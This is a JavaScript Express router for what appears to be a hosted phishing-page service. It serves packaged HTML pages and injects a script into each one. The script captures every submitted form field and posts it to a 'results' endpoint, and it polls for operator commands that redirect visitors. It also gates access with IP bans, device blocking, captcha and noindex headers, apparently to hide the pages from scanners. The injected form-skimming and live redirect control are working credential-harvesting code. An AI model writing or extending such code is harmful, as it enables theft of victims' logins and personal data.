import { Router } from "express";
import {
  findPackage,
  getSessionCommand,
  pageSubscriptionState,
  resolveUserPageSubscription,
  savePageResult,
  saveTrafficEvent,
  updateUserPageConfig
} from "../repositories/appRepository.js";
import {
  contentTypeFor,
  fetchGitHubPackageFile,
  previewFileForPackage,
  previewSourceForPackage,
  resolveRelativePath
} from "../services/packagePreview.js";
import {
  publicTurnstileConfig,
  turnstileSecretFor,
  verifyTurnstileToken
} from "../services/turnstile.js";
import { deviceBlocked } from "../services/deviceRules.js";

export const runtimeRouter = Router();

function requestIp(req) {
  return req.headers["cf-connecting-ip"]
    || req.headers["x-forwarded-for"]?.split(",")[0]?.trim()
    || req.socket.remoteAddress
    || "unknown";
}

function normalizeHost(value = "") {
  return String(value)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "")
    .replace(/:\d+$/, "");
}

function relaySecretFor(page) {
  return page?.hostingConfig?.relaySecret
    || page?.hostingConfig?.cloudflareRelaySecret
    || page?.generatedFile?.relaySecret
    || "";
}

function allowedHostsFor(page) {
  return Array.from(new Set([
    page?.domain,
    page?.hostingConfig?.domain
  ].map(normalizeHost).filter(Boolean)));
}

function publicPageConfig(page) {
  const security = page.securityConfig || {};
  return {
    id: page.id,
    pageId: page.slug,
    pageName: page.name,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    domain: page.domain,
    status: page.status,
    subscription: page.subscription,
    subscriptionState: pageSubscriptionState(page),
    hosting: {
      domain: page.hostingConfig?.domain || page.domain || "",
      hostingType: page.hostingConfig?.hostingType || "cpanel",
      installPath: page.hostingConfig?.installPath || "public_html",
      connectionType: page.hostingConfig?.connectionType || "cloudflare-worker",
      relayVerified: Boolean(page.hostingConfig?.relayVerified)
    },
    security: {
      domains: allowedHostsFor(page),
      captcha: Boolean(security.captcha),
      turnstile: publicTurnstileConfig(security),
      bannedIps: security.bannedIps || [],
      whitelistIps: security.whitelistIps || [],
      blockedDevices: security.blockedDevices || []
    },
    resultSettings: page.resultSettings || {},
    generatedFile: page.generatedFile || {},
    flow: page.flow || [],
    configs: page.configs || {}
  };
}

async function runtimeContext(req, res) {
  const userPageId = req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId;
  const page = await resolveUserPageSubscription(userPageId);
  if (!page) {
    res.status(404).json({ error: "Runtime page not found" });
    return null;
  }

  const expectedSecret = relaySecretFor(page);
  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret || req.query?.relaySecret;
  if (expectedSecret && providedSecret !== expectedSecret) {
    res.status(403).json({ error: "Relay secret rejected" });
    return null;
  }

  const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
  const allowedHosts = allowedHostsFor(page);
  if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
    res.status(403).json({ error: "Domain not authorized", host: clientHost });
    return null;
  }

  const subscriptionState = pageSubscriptionState(page);
  if (subscriptionState.blocked) {
    res.status(402).json({
      error: subscriptionState.status,
      reason: subscriptionState.status === "payment_failed"
        ? "Page subscription renewal failed. Fund wallet or renew manually."
        : "Page subscription expired. Renew from wallet to restore access.",
      userPageId: page.id,
      renewalDate: page.subscription?.renewalDate || null
    });
    return null;
  }

  return { page, clientHost, ip: requestIp(req) };
}

function securityDecision(page, ip, userAgent = "") {
  const security = page.securityConfig || {};
  const bannedIps = security.bannedIps || [];
  const whitelistIps = security.whitelistIps || [];
  if (whitelistIps.includes(ip)) return { allowed: true, reason: "IP whitelisted" };
  if (bannedIps.includes(ip)) return { allowed: false, reason: "IP blocked by page security rules" };
  const device = deviceBlocked(security, userAgent);
  if (device.blocked) return { allowed: false, reason: `${device.deviceType} devices are blocked`, deviceType: device.deviceType };
  if (page.status && page.status !== "active") return { allowed: false, reason: "Page subscription is not active" };
  return { allowed: true, reason: "Allowed", deviceType: device.deviceType };
}

function packageContainsFile(pagePackage, file) {
  const cleanFile = String(file || "").replace(/^\/+/, "");
  const files = pagePackage.packageManifest?.files || [];
  return files.some((item) => (item.path || item) === cleanFile);
}

function runtimeAssetUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/source/asset?${params.toString()}`;
}

function runtimePageUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/source?${params.toString()}`;
}

function rewriteRuntimeHtml(html, { userPageId, file }) {
  const rewritten = html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
    const resolved = resolveRelativePath(file, value);
    if (!resolved) return match;
    if (/\.html?$/i.test(resolved)) {
      return `${attr}="${runtimePageUrl(userPageId, resolved)}"`;
    }
    return `${attr}="${runtimeAssetUrl(userPageId, resolved)}"`;
  });

  const bridge = `<script>
(function () {
  const runtime = {
    userPageId: ${JSON.stringify(userPageId)},
    pageId: ${JSON.stringify(file)},
    sessionId: "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8)
  };

  function send(path, payload) {
    return fetch(path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userPageId: runtime.userPageId,
        pageId: runtime.pageId,
        sessionId: runtime.sessionId,
        hostname: window.location.hostname,
        path: window.location.pathname,
        createdAt: new Date().toISOString(),
        ...payload
      })
    }).catch(function () {});
  }

  send("/api/traffic", { event: "page_load", screen: runtime.pageId });

  function checkCommand() {
    const params = new URLSearchParams({
      userPageId: runtime.userPageId,
      sessionId: runtime.sessionId
    });
    fetch("/api/session-command?" + params.toString())
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        const command = data && data.command;
        if (command && command.action === "redirect" && command.targetUrl) {
          window.location.href = command.targetUrl;
        }
      })
      .catch(function () {});
  }

  window.setInterval(checkCommand, 4000);

  document.addEventListener("submit", function (event) {
    const form = event.target;
    if (!form || !(form instanceof HTMLFormElement)) return;
    const data = Object.fromEntries(new FormData(form).entries());
    send("/api/results", {
      screen: runtime.pageId,
      data: data,
      flow: [runtime.pageId],
      userAgent: navigator.userAgent
    });
  }, true);
})();
<\/script>`;

  if (rewritten.includes("</body>")) return rewritten.replace("</body>", `${bridge}</body>`);
  return `${rewritten}${bridge}`;
}

async function packageForRuntimePage(page) {
  const pagePackage = await findPackage(page.packageId || page.slug);
  if (!pagePackage) throw new Error("Runtime package not found");
  return pagePackage;
}

async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
  const context = await runtimeContext(req, res);
  if (!context) return;

  const pagePackage = await packageForRuntimePage(context.page);
  const requestedFile = String(req.query?.file || "");
  const file = requestedFile || previewFileForPackage(pagePackage);
  if (!file || !packageContainsFile(pagePackage, file)) {
    res.status(404).send("Package file not found");
    return;
  }

  const source = previewSourceForPackage(pagePackage, file);
  const response = await fetchGitHubPackageFile(source);
  if (asAsset || !/\.html?$/i.test(file)) {
    const buffer = Buffer.from(await response.arrayBuffer());
    res.setHeader("Content-Type", contentTypeFor(file));
    res.setHeader("Cache-Control", "private, max-age=60");
    res.send(buffer);
    return;
  }

  const html = await response.text();
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "private, max-age=60");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.send(rewriteRuntimeHtml(html, { userPageId: context.page.id, file }));
}

runtimeRouter.get("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.post("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  res.json({ config: publicPageConfig(context.page) });
});

runtimeRouter.get("/source", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res);
  } catch (error) {
    res.status(400).send(String(error.message || error));
  }
});

runtimeRouter.get("/source/asset", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res, { asAsset: true });
  } catch (error) {
    res.status(404).send(String(error.message || error));
  }
});

runtimeRouter.post("/security/check", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
  res.json({ ...decision, ip: context.ip, host: context.clientHost });
});

runtimeRouter.post("/verify-human", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
  if (!decision.allowed) {
    res.status(403).json({ verified: false, reason: decision.reason });
    return;
  }

  const security = context.page.securityConfig || {};
  if (!security.captcha) {
    res.json({ verified: true, skipped: true });
    return;
  }

  const result = await verifyTurnstileToken({
    token: req.body?.token || req.body?.["cf-turnstile-response"],
    secret: turnstileSecretFor(security),
    remoteIp: context.ip
  });
  res.status(result.success ? 200 : 400).json({
    verified: result.success,
    reason: result.error || (result.success ? "Verified" : "Turnstile verification failed")
  });
});

runtimeRouter.post("/traffic", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
  const event = await saveTrafficEvent({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    hostname: context.clientHost || req.body?.hostname,
    result: req.body?.result || (decision.allowed ? "allowed" : "blocked"),
    reason: req.body?.reason || decision.reason
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({ event, allowed: decision.allowed, reason: decision.reason });
});

runtimeRouter.get("/session-command", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const sessionId = req.query?.sessionId || req.body?.sessionId;
  const result = await getSessionCommand(context.page.id, sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/session-command", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const result = await getSessionCommand(context.page.id, req.body?.sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/results", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
  if (!decision.allowed) {
    res.status(403).json({ error: decision.reason });
    return;
  }
  const result = await savePageResult({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    pageName: context.page.name,
    hostname: context.clientHost || req.body?.hostname
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({ result });
});

runtimeRouter.post("/relay/verify", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const hostingConfig = {
    ...(context.page.hostingConfig || {}),
    relayVerified: true,
    relayVerifiedAt: new Date().toISOString(),
    verified: true,
    verifiedAt: new Date().toISOString(),
    liveStatus: "Live"
  };
  await updateUserPageConfig(context.page.id, { hostingConfig });
  res.json({ ok: true, host: context.clientHost, userPageId: context.page.id });
});
